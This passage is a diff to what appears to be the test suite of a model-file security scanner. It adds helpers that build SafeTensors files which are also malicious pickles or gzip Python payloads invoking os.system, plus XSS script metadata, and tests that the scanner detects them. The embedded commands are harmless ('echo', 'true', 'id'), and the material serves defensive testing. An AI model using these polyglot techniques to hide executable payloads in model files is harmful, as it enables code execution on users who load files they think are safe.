@@ -225,6 +225,120 @@ def _build_protocolless_binary_benign_scalar_pickle() -> bytes:
     return b"\x8c\x02os\x94."
 
 
+def _write_pickle_safetensors_polyglot(path: Path, header_length: int) -> None:
+    """Write a valid SafeTensors file whose bytes are also a dangerous pickle."""
+    pickle_tail = b"\n0cos\nsystem\n(Vecho modelaudit-polyglot\ntR."
+    metadata = json.dumps(
+        {
+            "tensor": {
+                "dtype": "U8",
+                "shape": [len(pickle_tail)],
+                "data_offsets": [0, len(pickle_tail)],
+            }
+        },
+        separators=(",", ":"),
+    ).encode()
+    assert len(metadata) <= header_length
+    path.write_bytes(
+        struct.pack("<Q", header_length) + metadata + (b" " * (header_length - len(metadata))) + pickle_tail
+    )
+
+
+def _write_safetensors_pickle_tail(
+    path: Path,
+    header_length: int,
+    pickle_tail: bytes,
+    *,
+    custom_metadata: dict[str, str] | None = None,
+) -> None:
+    header: dict[str, Any] = {
+        "t": {
+            "dtype": "U8",
+            "shape": [len(pickle_tail)],
+            "data_offsets": [0, len(pickle_tail)],
+        }
+    }
+    if custom_metadata is not None:
+        header["__metadata__"] = custom_metadata
+    metadata = json.dumps(header, separators=(",", ":")).encode()
+    assert len(metadata) <= header_length
+    path.write_bytes(
+        struct.pack("<Q", header_length) + metadata + (b" " * (header_length - len(metadata))) + pickle_tail
+    )
+
+
+def _write_oversized_pickle_safetensors_polyglot(path: Path, opcode: bytes) -> None:
+    """Write a sparse oversized SafeTensors candidate with a skipped pickle operand."""
+    operand_length = file_detection.PROTO0_1_MAX_PROBE_BYTES + 4
+    operand = b"\x00\x00\x00{" + bytes(operand_length - 4)
+    pickle_stream = (
+        opcode + struct.pack("<I", operand_length) + operand + b"0" + _build_protocolless_binary_malicious_pickle()
+    )
+    header_length = struct.unpack("<Q", pickle_stream[:8])[0]
+    assert header_length > SAFETENSORS_ROUTING_HEADER_PARSE_BYTES
+    with path.open("wb") as handle:
+        handle.write(pickle_stream)
+        handle.truncate(8 + header_length)
+
+
+def _write_gzip_safetensors_polyglot(
+    path: Path,
+    *,
+    include_xss: bool = True,
+    include_python_payload: bool = True,
+    trailing_data: bytes = b"",
+) -> None:
+    """Write a valid SafeTensors file that is also a valid gzip Python payload."""
+    gzip_header = b'\x1f\x8b\x08\x00\x00\x00\x00\x00{"'
+    header_length = int.from_bytes(gzip_header[:8], "little")
+    block_length = 0xA2C2
+    blocks: list[bytes] = []
+    uncompressed = bytearray()
+    for block_index in range(13):
+        data = bytearray(b"a" * block_length)
+        if block_index == 0:
+            data[:3] = b"'''"
+        blocks.append(b"\x60" + struct.pack("<H", block_length) + struct.pack("<H", block_length ^ 0xFFFF) + data)
+        uncompressed.extend(data)
+
+    final_length = 20_000
+    gzip_member_size = len(gzip_header) + sum(len(block) for block in blocks) + 5 + final_length + 8
+    file_size = gzip_member_size + len(trailing_data)
+    header_end = 8 + header_length
+    tensor_data_size = file_size - header_end
+    tensor_data_size_bytes = str(tensor_data_size).encode()
+    custom_metadata = b',"__metadata__":{"note":"<script>alert(1)</script>"}' if include_xss else b""
+    closure = (
+        b'":{"dtype":"U8","shape":['
+        + tensor_data_size_bytes
+        + b'],"data_offsets":[0,'
+        + tensor_data_size_bytes
+        + b"]}"
+        + custom_metadata
+        + b"}"
+    )
+    final_data_start = len(gzip_header) + sum(len(block) for block in blocks) + 5
+    closure_start = header_end - len(closure)
+    closure_in_final = closure_start - final_data_start
+    boundary_in_final = header_end - final_data_start
+    assert 0 <= closure_in_final < boundary_in_final < final_length
+
+    final_data = bytearray(b"a" * final_length)
+    final_data[closure_in_final:boundary_in_final] = closure
+    python_tail = b"'''\nimport os\nos.system('id')\n" if include_python_payload else b"'''\n"
+    final_data[boundary_in_final : boundary_in_final + len(python_tail)] = python_tail
+    final_data[boundary_in_final + len(python_tail) :] = b" " * (final_length - boundary_in_final - len(python_tail))
+    blocks.append(b"\x61" + struct.pack("<H", final_length) + struct.pack("<H", final_length ^ 0xFFFF) + final_data)
+    uncompressed.extend(final_data)
+
+    gzip_member = gzip_header + b"".join(blocks)
+    gzip_member += struct.pack("<II", zlib.crc32(uncompressed), len(uncompressed) & 0xFFFFFFFF)
+    payload = gzip_member + trailing_data
+    assert json.loads(payload[8:header_end].decode("utf-8"))
+    assert gzip.decompress(gzip_member) == uncompressed
+    path.write_bytes(payload)
+
+
 def _require_tf_protos() -> None:
     if not _has_tf_protos():
         pytest.skip("TensorFlow protobuf stubs unavailable")
@@ -3468,6 +3582,961 @@ def test_scan_file_malformed_zip64_locator_offset_fails_closed_without_raising(t
     assert any(check.name == "ZIP Central Directory Preflight" for check in result.checks)
 
 
+@pytest.mark.parametrize(
+    "header_length",
+    [ord("V"), 0x560280],
+    ids=["protocol-0", "protocol-2"],
+)
+def test_scan_file_routes_pickle_safetensors_polyglot_to_pickle(
+    tmp_path: Path,
+    header_length: int,
+) -> None:
+    polyglot = tmp_path / "payload.unknown"
+    _write_pickle_safetensors_polyglot(polyglot, header_length)
+
+    assert file_detection.detect_file_format(str(polyglot)) == "pickle"
+    assert file_detection.detect_file_format_from_magic(str(polyglot)) == "pickle"
+    assert file_detection.detect_file_format_for_skip_filter(str(polyglot)) == "pickle"
+
+    result = scan_file(
+        str(polyglot),
+        config={"scanners": ["pickle"], "cache_enabled": False},
+    )
+
+    assert result.scanner_name == "pickle"
+    _assert_system_pickle_issue(result)
+
+
+def test_scan_file_routes_safetensors_pickle_operand_crossing_short_probe(tmp_path: Path) -> None:
+    pickle_tail = (b"A" * file_detection.PROTO0_1_MAX_PROBE_BYTES) + b"\n0cos\nsystem\n(Vtrue\ntR."
+    header_length = ord("V")
+    metadata = json.dumps(
+        {
+            "tensor": {
+                "dtype": "U8",
+                "shape": [len(pickle_tail)],
+                "data_offsets": [0, len(pickle_tail)],
+            }
+        },
+        separators=(",", ":"),
+    ).encode()
+    assert len(metadata) <= header_length
+    polyglot = tmp_path / "truncated-operand.unknown"
+    polyglot.write_bytes(
+        struct.pack("<Q", header_length) + metadata + (b" " * (header_length - len(metadata))) + pickle_tail
+    )
+
+    assert file_detection.detect_file_format(str(polyglot)) == "pickle"
+    assert file_detection.detect_file_format_from_magic(str(polyglot)) == "pickle"
+    assert file_detection.detect_file_format_for_skip_filter(str(polyglot)) == "pickle"
+
+    result = scan_file(str(polyglot), config={"cache_enabled": False})
+
+    assert result.scanner_name == "pickle"
+    _assert_system_pickle_issue(result)
+
+
+def test_scan_file_routes_security_pickle_in_complete_frame(tmp_path: Path) -> None:
+    pickle_body = b"cos\nsystem\n(Vtrue\ntR."
+    pickle_tail = b"\n0\x95" + struct.pack("<Q", len(pickle_body)) + pickle_body
+    polyglot = tmp_path / "framed-pickle.unknown"
+    _write_safetensors_pickle_tail(polyglot, ord("V"), pickle_tail)
+
+    assert file_detection.detect_file_format(str(polyglot)) == "pickle"
+    assert file_detection.detect_file_format_from_magic(str(polyglot)) == "pickle"
+    assert file_detection.detect_file_format_for_skip_filter(str(polyglot)) == "pickle"
+
+    result = scan_file(str(polyglot), config={"cache_enabled": False})
+
+    assert result.scanner_name == "pickle"
+    _assert_system_pickle_issue(result)
+
+
+def test_scan_file_routes_frame_spanning_binbytes_safetensors_collision_to_pickle(tmp_path: Path) -> None:
+    # CPython joins the active frame remainder with the underlying stream for BINBYTES payloads.
+    frame_body = b"B" + struct.pack("<I", 4) + b"AB"
+    pickle_tail = (
+        b"\n0\x95"
+        + struct.pack("<Q", 2)
+        + b"\x95X"
+        + struct.pack("<Q", len(frame_body))
+        + frame_body
+        + b"CD0cos\nsystem\n(Vtrue\ntR."
+    )
+    polyglot = tmp_path / "frame-spanning-binbytes.unknown"
+    _write_safetensors_pickle_tail(polyglot, ord("V"), pickle_tail)
+
+    assert file_detection.detect_file_format(str(polyglot)) == "pickle"
+    assert file_detection.detect_file_format_from_magic(str(polyglot)) == "pickle"
+    assert file_detection.detect_file_format_for_skip_filter(str(polyglot)) == "pickle"
+
+    result = scan_file(str(polyglot), config={"cache_enabled": False})
+
+    assert result.scanner_name == "pickle"
+    _assert_system_pickle_issue(result)
+
+
+@pytest.mark.parametrize(
+    "invalid_suffix",
+    [
+        b"\xff",
+        b"00N.",
+        b"\x80\x07N.",
+        b"\x95" + struct.pack("<Q", 1_000_000) + b"N.",
+    ],
+    ids=["unknown-opcode", "stack-underflow", "unsupported-protocol", "truncated-late-frame"],
+)
+def test_scan_file_keeps_reached_pickle_security_signal_after_late_error(
+    tmp_path: Path,
+    invalid_suffix: bytes,
+) -> None:
+    pickle_tail = b"\n0cos\nsystem\n(Vtrue\ntR" + invalid_suffix
+    polyglot = tmp_path / "late-error.unknown"
+    _write_safetensors_pickle_tail(polyglot, ord("V"), pickle_tail)
+
+    assert file_detection.detect_file_format(str(polyglot)) == "pickle"
+    assert file_detection.detect_file_format_from_magic(str(polyglot)) == "pickle"
+    assert file_detection.detect_file_format_for_skip_filter(str(polyglot)) == "pickle"
+
+    result = scan_file(str(polyglot), config={"cache_enabled": False})
+
+    assert result.scanner_name == "pickle"
+    _assert_system_pickle_issue(result)
+
+
+def test_scan_file_routes_security_pickle_in_follow_on_stream(tmp_path: Path) -> None:
+    pickle_tail = b"\n0N." + b"cos\nsystem\n(Vtrue\ntR."
+    polyglot = tmp_path / "follow-on-stream.unknown"
+    _write_safetensors_pickle_tail(polyglot, ord("V"), pickle_tail)
+
+    assert file_detection.detect_file_format(str(polyglot)) == "pickle"
+    assert file_detection.detect_file_format_from_magic(str(polyglot)) == "pickle"
+    assert file_detection.detect_file_format_for_skip_filter(str(polyglot)) == "pickle"
+
+    result = scan_file(str(polyglot), config={"cache_enabled": False})
+
+    assert result.scanner_name == "pickle"
+    _assert_system_pickle_issue(result)
+
+
+def test_scan_file_routes_follow_on_pickle_using_persistent_memo(tmp_path: Path) -> None:
+    first_stream = b"\n0\x8c\x02os\x94\x8c\x06system\x94N."
+    second_stream = b"h\x00h\x01\x93(X\x04\x00\x00\x00true\x85R."
+    polyglot = tmp_path / "persistent-memo.unknown"
+    _write_safetensors_pickle_tail(polyglot, ord("V"), first_stream + second_stream)
+
+    assert file_detection.detect_file_format(str(polyglot)) == "pickle"
+    assert file_detection.detect_file_format_from_magic(str(polyglot)) == "pickle"
+    assert file_detection.detect_file_format_for_skip_filter(str(polyglot)) == "pickle"
+
+    result = scan_file(str(polyglot), config={"cache_enabled": False})
+
+    assert result.scanner_name == "pickle"
+    assert any(issue.rule_code in {"S201", "S205"} for issue in result.issues)
+
+
+def test_scan_file_routes_empty_module_stack_global_safetensors_collision_to_pickle(tmp_path: Path) -> None:
+    pickle_tail = b"\n0U\x00U\x06system\x93(Vtrue\ntR."
+    polyglot = tmp_path / "empty-module-stack-global.unknown"
+    _write_safetensors_pickle_tail(polyglot, ord("V"), pickle_tail)
+
+    assert file_detection.detect_file_format(str(polyglot)) == "pickle"
+    assert file_detection.detect_file_format_from_magic(str(polyglot)) == "pickle"
+    assert file_detection.detect_file_format_for_skip_filter(str(polyglot)) == "pickle"
+
+    result = scan_file(str(polyglot), config={"cache_enabled": False})
+
+    assert result.scanner_name == "pickle"
+    assert any(
+        issue.rule_code == "NON_ALLOWLISTED_GLOBAL"
+        and issue.details.get("invoked") is True
+        and issue.details.get("associated_global") == ".system"
+        for issue in result.issues
+    )
+
+
+def test_scan_file_keeps_empty_bytes_stack_global_safetensors_collision_clean(tmp_path: Path) -> None:
+    polyglot = tmp_path / "empty-bytes-stack-global.unknown"
+    _write_safetensors_pickle_tail(polyglot, ord("V"), b"\n0C\x00\x8c\x02os\x93.")
+
+    assert file_detection.detect_file_format(str(polyglot)) == "safetensors"
+    assert file_detection.detect_file_format_from_magic(str(polyglot)) == "safetensors"
+    assert file_detection.detect_file_format_for_skip_filter(str(polyglot)) == "safetensors"
+
+    result = scan_file(str(polyglot), config={"cache_enabled": False})
+
+    assert result.scanner_name == "safetensors"
+    assert result.success is True
+    assert not result.issues
+
+
+def test_scan_file_routes_security_pickle_after_early_frame_stop(tmp_path: Path) -> None:
+    framed_benign_stream = b"\x95" + struct.pack("<Q", 20) + b"N." + (b"\x00" * 18)
+    pickle_tail = b"\n0" + framed_benign_stream + b"cos\nsystem\n(Vtrue\ntR."
+    polyglot = tmp_path / "post-frame-stream.unknown"
+    _write_safetensors_pickle_tail(polyglot, ord("V"), pickle_tail)
+
+    assert file_detection.detect_file_format(str(polyglot)) == "pickle"
+    assert file_detection.detect_file_format_from_magic(str(polyglot)) == "pickle"
+    assert file_detection.detect_file_format_for_skip_filter(str(polyglot)) == "pickle"
+
+    result = scan_file(str(polyglot), config={"cache_enabled": False})
+
+    assert result.scanner_name == "pickle"
+    _assert_system_pickle_issue(result)
+
+
+def test_scan_file_routes_security_pickle_after_valid_list_setitem(tmp_path: Path) -> None:
+    pickle_tail = b"\n0]NaK\x00Ns0cos\nsystem\n(Vtrue\ntR."
+    polyglot = tmp_path / "list-setitem.unknown"
+    _write_safetensors_pickle_tail(polyglot, ord("V"), pickle_tail)
+
+    assert file_detection.detect_file_format(str(polyglot)) == "pickle"
+    assert file_detection.detect_file_format_from_magic(str(polyglot)) == "pickle"
+    assert file_detection.detect_file_format_for_skip_filter(str(polyglot)) == "pickle"
+
+    result = scan_file(str(polyglot), config={"cache_enabled": False})
+
+    assert result.scanner_name == "pickle"
+    _assert_system_pickle_issue(result)
+
+
+def test_scan_file_routes_security_pickle_after_memoized_list_mutation(tmp_path: Path) -> None:
+    pickle_tail = b"\n0]\x94Na0h\x00K\x00Ns0cos\nsystem\n(Vtrue\ntR."
+    polyglot = tmp_path / "memoized-list-mutation.unknown"
+    _write_safetensors_pickle_tail(polyglot, ord("V"), pickle_tail)
+
+    assert file_detection.detect_file_format(str(polyglot)) == "pickle"
+    assert file_detection.detect_file_format_from_magic(str(polyglot)) == "pickle"
+    assert file_detection.detect_file_format_for_skip_filter(str(polyglot)) == "pickle"
+
+    result = scan_file(str(polyglot), config={"cache_enabled": False})
+
+    assert result.scanner_name == "pickle"
+    _assert_system_pickle_issue(result)
+
+
+def test_scan_file_routes_security_pickle_after_boolean_list_index(tmp_path: Path) -> None:
+    pickle_tail = b"\n0]Na\x89Ns0cos\nsystem\n(Vtrue\ntR."
+    polyglot = tmp_path / "boolean-list-index.unknown"
+    _write_safetensors_pickle_tail(polyglot, ord("V"), pickle_tail)
+
+    assert file_detection.detect_file_format(str(polyglot)) == "pickle"
+    assert file_detection.detect_file_format_from_magic(str(polyglot)) == "pickle"
+    assert file_detection.detect_file_format_for_skip_filter(str(polyglot)) == "pickle"
+
+    result = scan_file(str(polyglot), config={"cache_enabled": False})
+
+    assert result.scanner_name == "pickle"
+    _assert_system_pickle_issue(result)
+
+
+@pytest.mark.parametrize(
+    "pickle_tail",
+    [b"\n0Ncos\nsystem\n.", b"\n0}q\x000Nq\x000cos\nsystem\n."],
+    ids=["residual-stack", "memo-overwrite"],
+)
+def test_scan_file_routes_cpython_valid_safetensors_pickle_overlap(
+    tmp_path: Path,
+    pickle_tail: bytes,
+) -> None:
+    header_length = ord("V")
+    metadata = json.dumps(
+        {
+            "tensor": {
+                "dtype": "U8",
+                "shape": [len(pickle_tail)],
+                "data_offsets": [0, len(pickle_tail)],
+            }
+        },
+        separators=(",", ":"),
+    ).encode()
+    polyglot = tmp_path / "cpython-valid-overlap.unknown"
+    polyglot.write_bytes(
+        struct.pack("<Q", header_length) + metadata + (b" " * (header_length - len(metadata))) + pickle_tail
+    )
+
+    assert file_detection.detect_file_format(str(polyglot)) == "pickle"
+    assert file_detection.detect_file_format_from_magic(str(polyglot)) == "pickle"
+    assert file_detection.detect_file_format_for_skip_filter(str(polyglot)) == "pickle"
+
+    result = scan_file(str(polyglot), config={"cache_enabled": False})
+
+    assert result.scanner_name == "pickle"
+    _assert_system_pickle_issue(result)
+
+
+def test_scan_file_routes_binpersid_safetensors_polyglot_to_pickle(tmp_path: Path) -> None:
+    prefix = b"\x88Q.\x00\x00\x00\x00\x00"
+    header_length = struct.unpack("<Q", prefix)[0]
+    polyglot = tmp_path / "persistent-id.unknown"
+    polyglot.write_bytes(prefix + b"{}" + (b" " * (header_length - 2)))
+
+    assert file_detection.detect_file_format(str(polyglot)) == "pickle"
+    assert file_detection.detect_file_format_from_magic(str(polyglot)) == "pickle"
+    assert file_detection.detect_file_format_for_skip_filter(str(polyglot)) == "pickle"
+
+    result = scan_file(
+        str(polyglot),
+        config={"scanners": ["pickle"], "cache_enabled": False},
+    )
+
+    assert result.scanner_name == "pickle"
+    assert any(issue.rule_code == "S212" for issue in result.issues)
+
+
+@pytest.mark.parametrize(
+    "header_length",
+    [0x2E51, 0x2E52, 0x2E62, 0x2E81, 0x2E92, 0x2E93],
+    ids=["binpersid", "reduce", "build", "newobj", "newobj-ex", "stack-global"],
+)
+def test_scan_file_keeps_stack_invalid_pickle_shaped_safetensors_clean(
+    tmp_path: Path,
+    header_length: int,
+) -> None:
+    metadata = b'{"tensor":{"dtype":"U8","shape":[1],"data_offsets":[0,1]}}'
+    metadata += b" " * (header_length - len(metadata))
+    safetensors_path = tmp_path / "stack-invalid-pickle-shape.unknown"
+    safetensors_path.write_bytes(struct.pack("<Q", header_length) + metadata + b"\x00")
+
+    result = scan_file(str(safetensors_path), config={"cache_enabled": False})
+
+    assert result.scanner_name == "safetensors"
+    assert result.success is True
+    assert not result.issues
+
+
+def test_scan_file_keeps_large_aligned_safetensors_header_collision_clean(tmp_path: Path) -> None:
+    header_length = 80
+    data_length = file_detection.PROTO0_1_MAX_PROBE_BYTES + 4096
+    metadata = json.dumps(
+        {
+            "tensor": {
+                "dtype": "U8",
+                "shape": [data_length],
+                "data_offsets": [0, data_length],
+            }
+        },
+        separators=(",", ":"),
+    ).encode()
+    assert len(metadata) <= header_length
+    safetensors_path = tmp_path / "aligned-header.unknown"
+    safetensors_path.write_bytes(
+        struct.pack("<Q", header_length) + metadata + (b" " * (header_length - len(metadata))) + bytes(data_length)
+    )
+
+    assert file_detection.detect_file_format(str(safetensors_path)) == "safetensors"
+    assert file_detection.detect_file_format_from_magic(str(safetensors_path)) == "safetensors"
+    assert file_detection.detect_file_format_for_skip_filter(str(safetensors_path)) == "safetensors"
+
+    result = scan_file(str(safetensors_path), config={"cache_enabled": False})
+
+    assert result.scanner_name == "safetensors"
+    assert result.success is True
+    assert not result.issues
+
+
+@pytest.mark.parametrize(
+    "pickle_body",
+    [b"cos\nsystem\n.", b"cos\nsystem\nN."],
+    ids=["balanced-stack", "residual-stack"],
+)
+def test_scan_file_keeps_truncated_frame_safetensors_collision_clean(
+    tmp_path: Path,
+    pickle_body: bytes,
+) -> None:
+    pickle_tail = b"\n0\x95" + struct.pack("<Q", 1_000_000) + pickle_body
+    header_length = ord("V")
+    metadata = json.dumps(
+        {
+            "tensor": {
+                "dtype": "U8",
+                "shape": [len(pickle_tail)],
+                "data_offsets": [0, len(pickle_tail)],
+            }
+        },
+        separators=(",", ":"),
+    ).encode()
+    safetensors_path = tmp_path / "truncated-frame.unknown"
+    safetensors_path.write_bytes(
+        struct.pack("<Q", header_length) + metadata + (b" " * (header_length - len(metadata))) + pickle_tail
+    )
+
+    assert file_detection.detect_file_format(str(safetensors_path)) == "safetensors"
+    assert file_detection.detect_file_format_from_magic(str(safetensors_path)) == "safetensors"
+    assert file_detection.detect_file_format_for_skip_filter(str(safetensors_path)) == "safetensors"
+
+    result = scan_file(str(safetensors_path), config={"cache_enabled": False})
+
+    assert result.scanner_name == "safetensors"
+    assert result.success is True
+    assert not result.issues
+
+
+def test_scan_file_routes_executable_nested_frame_safetensors_collision_to_pickle(tmp_path: Path) -> None:
+    pickle_body = b"cos\nsystem\n."
+    pickle_tail = (
+        b"\n0\x95" + struct.pack("<Q", 20) + b"\x95" + struct.pack("<Q", len(pickle_body)) + pickle_body + bytes(32)
+    )
+    safetensors_path = tmp_path / "nested-frame.unknown"
+    _write_safetensors_pickle_tail(safetensors_path, ord("V"), pickle_tail)
+
+    assert file_detection.detect_file_format(str(safetensors_path)) == "pickle"
+    assert file_detection.detect_file_format_from_magic(str(safetensors_path)) == "pickle"
+    assert file_detection.detect_file_format_for_skip_filter(str(safetensors_path)) == "pickle"
+
+    result = scan_file(str(safetensors_path), config={"cache_enabled": False})
+
+    assert result.scanner_name == "pickle"
+    _assert_system_pickle_issue(result)
+
+
+def test_scan_file_routes_large_safetensors_pickle_from_declared_frame_end(tmp_path: Path) -> None:
+    operand = b"x" * SAFETENSORS_ROUTING_HEADER_PARSE_BYTES
+    pickle_tail = (
+        b"\n0B"
+        + struct.pack("<I", len(operand))
+        + operand
+        + b"0\x95"
+        + struct.pack("<Q", 20)
+        + b"N."
+        + bytes(18)
+        + b"cos\nsystem\n."
+    )
+    polyglot = tmp_path / "large-frame-end.unknown"
+    _write_safetensors_pickle_tail(polyglot, ord("V"), pickle_tail)
+
+    assert file_detection.detect_file_format(str(polyglot)) == "pickle"
+    assert file_detection.detect_file_format_from_magic(str(polyglot)) == "pickle"
+    assert file_detection.detect_file_format_for_skip_filter(str(polyglot)) == "pickle"
+
+    result = scan_file(str(polyglot), config={"cache_enabled": False})
+
+    assert result.scanner_name == "pickle"
+    assert any(
+        issue.details.get("pickle_rule_code") == "DANGEROUS_GLOBAL"
+        and issue.details.get("associated_global") == "os.system"
+        for issue in result.issues
+    )
+
+
+def test_scan_file_keeps_failed_pickle_load_with_memo_safetensors_collision_clean(tmp_path: Path) -> None:
+    polyglot = tmp_path / "failed-load-with-memo.unknown"
+    _write_safetensors_pickle_tail(polyglot, ord("V"), b"\n0]q\x00acos\nsystem\n.")
+
+    assert file_detection.detect_file_format(str(polyglot)) == "safetensors"
+    assert file_detection.detect_file_format_from_magic(str(polyglot)) == "safetensors"
+    assert file_detection.detect_file_format_for_skip_filter(str(polyglot)) == "safetensors"
+
+    result = scan_file(str(polyglot), config={"cache_enabled": False})
+
+    assert result.scanner_name == "safetensors"
+    assert result.success is True
+    assert not result.issues
+
+
+def test_pickle_frame_alternates_share_one_work_budget() -> None:
+    block_end = 24
+    frame_fork_block = (
+        b"\x95"
+        + struct.pack("<Q", block_end - 9)
+        + b"N."
+        + b"\x95"
+        + struct.pack("<Q", block_end - (11 + 9))
+        + b"N.\xff\xff"
+    )
+    payload = (frame_fork_block * 20) + b"N."
+    budget = file_detection._PickleProbeWorkBudget()
+
+    state = file_detection._classify_initial_pickle_security_signal(
+        payload,
+        sample_is_prefix=False,
+        available_stream_length=len(payload),
+        _work_budget=budget,
+    )
+
+    assert state is None
+    assert budget.remaining_frame_branches == 0
+    assert budget.remaining_opcodes >= 0
+
+
+def test_pickle_tuple_hashability_is_cached_across_opcodes() -> None:
+    item_count = 4000
+    payload = b"}(" + (b"N" * item_count) + b"tq\x00Ns" + (b"h\x00Ns" * item_count) + b"."
+    budget = file_detection._PickleProbeWorkBudget()
+
+    state = file_detection._classify_initial_pickle_security_signal(
+        payload,
+        sample_is_prefix=False,
+        available_stream_length=len(payload),
+        _work_budget=budget,
+    )
+
+    assert state is False
+    assert len(budget.hashability_cache) == 1
+
+
+def test_scan_file_routes_hashable_tuple_alias_pickle_overlap(tmp_path: Path) -> None:
+    pickle_tail = b"\n0N" + (b"2\x86" * 25) + b"p0\n0(g0\nNd0cos\nsystem\n(Vtrue\ntR."
+    polyglot = tmp_path / "tuple-alias-pickle.unknown"
+    _write_safetensors_pickle_tail(polyglot, ord("V"), pickle_tail)
+
+    assert file_detection.detect_file_format(str(polyglot)) == "pickle"
+    assert file_detection.detect_file_format_from_magic(str(polyglot)) == "pickle"
+    assert file_detection.detect_file_format_for_skip_filter(str(polyglot)) == "pickle"
+
+    result = scan_file(str(polyglot), config={"cache_enabled": False})
+
+    assert result.scanner_name == "pickle"
+    _assert_system_pickle_issue(result)
+
+
+@pytest.mark.parametrize("header_length", [ord("F"), ord("S")], ids=["invalid-float", "invalid-string"])
+def test_scan_file_keeps_invalid_long_line_operand_safetensors_collision_clean(
+    tmp_path: Path,
+    header_length: int,
+) -> None:
+    pickle_tail = (b"A" * file_detection.PROTO0_1_MAX_PROBE_BYTES) + b"\n0cos\nsystem\n(Vignored\ntR."
+    safetensors_path = tmp_path / "invalid-line-operand.unknown"
+    _write_safetensors_pickle_tail(safetensors_path, header_length, pickle_tail)
+
+    assert file_detection.detect_file_format(str(safetensors_path)) == "safetensors"
+    assert file_detection.detect_file_format_from_magic(str(safetensors_path)) == "safetensors"
+    assert file_detection.detect_file_format_for_skip_filter(str(safetensors_path)) == "safetensors"
+
+    result = scan_file(str(safetensors_path), config={"cache_enabled": False})
+
+    assert result.scanner_name == "safetensors"
+    assert result.success is True
+    assert not result.issues
+
+
+def test_scan_file_keeps_semantically_invalid_pickle_prefix_safetensors_clean(tmp_path: Path) -> None:
+    pickle_tail = b"\n0\x96" + struct.pack("<Q", 1) + b"x" + b"M\x00\x01a0cos\nsystem\n(Vtrue\ntR."
+    safetensors_path = tmp_path / "invalid-bytearray-append.unknown"
+    _write_safetensors_pickle_tail(safetensors_path, ord("V"), pickle_tail)
+
+    assert file_detection.detect_file_format(str(safetensors_path)) == "safetensors"
+    assert file_detection.detect_file_format_from_magic(str(safetensors_path)) == "safetensors"
+    assert file_detection.detect_file_format_for_skip_filter(str(safetensors_path)) == "safetensors"
+
+    result = scan_file(str(safetensors_path), config={"cache_enabled": False})
+
+    assert result.scanner_name == "safetensors"
+    assert result.success is True
+    assert not result.issues
+
+
+def test_scan_file_keeps_unhashable_pickle_dict_key_safetensors_clean(tmp_path: Path) -> None:
+    pickle_tail = b"\n0}]Ns0cos\nsystem\n(Vtrue\ntR."
+    safetensors_path = tmp_path / "unhashable-dict-key.unknown"
+    _write_safetensors_pickle_tail(safetensors_path, ord("V"), pickle_tail)
+
+    assert file_detection.detect_file_format(str(safetensors_path)) == "safetensors"
+    assert file_detection.detect_file_format_from_magic(str(safetensors_path)) == "safetensors"
+    assert file_detection.detect_file_format_for_skip_filter(str(safetensors_path)) == "safetensors"
+
+    result = scan_file(str(safetensors_path), config={"cache_enabled": False})
+
+    assert result.scanner_name == "safetensors"
+    assert result.success is True
+    assert not result.issues
+
+
+@pytest.mark.parametrize(
+    "pickle_tail",
+    [b"\n0(2cos\nsystem\n(Vtrue\ntR.", b"\n0(\x85cos\nsystem\n(Vtrue\ntR."],
+    ids=["dup-mark", "tuple1-mark"],
+)
+def test_scan_file_keeps_unexpected_pickle_mark_safetensors_clean(
+    tmp_path: Path,
+    pickle_tail: bytes,
+) -> None:
+    safetensors_path = tmp_path / "unexpected-pickle-mark.unknown"
+    _write_safetensors_pickle_tail(safetensors_path, ord("V"), pickle_tail)
+
+    assert file_detection.detect_file_format(str(safetensors_path)) == "safetensors"
+    assert file_detection.detect_file_format_from_magic(str(safetensors_path)) == "safetensors"
+    assert file_detection.detect_file_format_for_skip_filter(str(safetensors_path)) == "safetensors"
+
+    result = scan_file(str(safetensors_path), config={"cache_enabled": False})
+
+    assert result.scanner_name == "safetensors"
+    assert result.success is True
+    assert not result.issues
+
+
+@pytest.mark.parametrize(
+    "pickle_body",
+    [b"NNR.", b"NN\x93.", b"N)\x81.", b"N}b.", b"(No."],
+    ids=["reduce", "stack-global", "newobj", "build", "obj"],
+)
+def test_scan_file_keeps_known_type_invalid_pickle_safetensors_clean(
+    tmp_path: Path,
+    pickle_body: bytes,
+) -> None:
+    safetensors_path = tmp_path / "known-type-invalid-pickle.unknown"
+    _write_safetensors_pickle_tail(safetensors_path, ord("V"), b"\n0" + pickle_body)
+
+    assert file_detection.detect_file_format(str(safetensors_path)) == "safetensors"
+    assert file_detection.detect_file_format_from_magic(str(safetensors_path)) == "safetensors"
+    assert file_detection.detect_file_format_for_skip_filter(str(safetensors_path)) == "safetensors"
+
+    result = scan_file(str(safetensors_path), config={"cache_enabled": False})
+
+    assert result.scanner_name == "safetensors"
+    assert result.success is True
+    assert not result.issues
+
+
+def test_scan_file_routes_none_state_build_safetensors_overlap_to_pickle(tmp_path: Path) -> None:
+    pickle_tail = b"\n0NNbcos\nsystem\n(Vtrue\ntR."
+    polyglot = tmp_path / "none-state-build-pickle.unknown"
+    _write_safetensors_pickle_tail(polyglot, ord("V"), pickle_tail)
+
+    assert file_detection.detect_file_format(str(polyglot)) == "pickle"
+    assert file_detection.detect_file_format_from_magic(str(polyglot)) == "pickle"
+    assert file_detection.detect_file_format_for_skip_filter(str(polyglot)) == "pickle"
+
+    result = scan_file(str(polyglot), config={"cache_enabled": False})
+
+    assert result.scanner_name == "pickle"
+    _assert_system_pickle_issue(result)
+
+
+def test_scan_file_merges_safetensors_findings_for_pickle_overlap(tmp_path: Path) -> None:
+    pickle_tail = b"\n0cos\nsystem\n(Vtrue\ntR."
+    polyglot = tmp_path / "metadata-and-pickle.unknown"
+    _write_safetensors_pickle_tail(
+        polyglot,
+        0x0156,
+        pickle_tail,
+        custom_metadata={"note": "<script>alert(1)</script>"},
+    )
+
+    result = scan_file(str(polyglot), config={"cache_enabled": False})
+
+    assert result.scanner_name == "pickle"
+    assert "safetensors" in result.metadata["supplemental_scanners"]
+    _assert_system_pickle_issue(result)
+    assert any(check.name == "SafeTensors XSS/HTML Injection Detection" for check in result.checks)
+
+    safetensors_only_result = scan_file(
+        str(polyglot),
+        config={"cache_enabled": False, "scanners": ["safetensors"]},
+    )
+    assert any(check.name == "SafeTensors XSS/HTML Injection Detection" for check in safetensors_only_result.checks)
+    assert safetensors_only_result.success is False
+
+
+@pytest.mark.parametrize("opcode", [b"B", b"X"], ids=["binbytes", "binunicode"])
+def test_scan_file_routes_oversized_pickle_safetensors_polyglot_to_pickle(
+    tmp_path: Path,
+    opcode: bytes,
+) -> None:
+    polyglot = tmp_path / "oversized.unknown"
+    _write_oversized_pickle_safetensors_polyglot(polyglot, opcode)
+
+    with polyglot.open("rb") as handle:
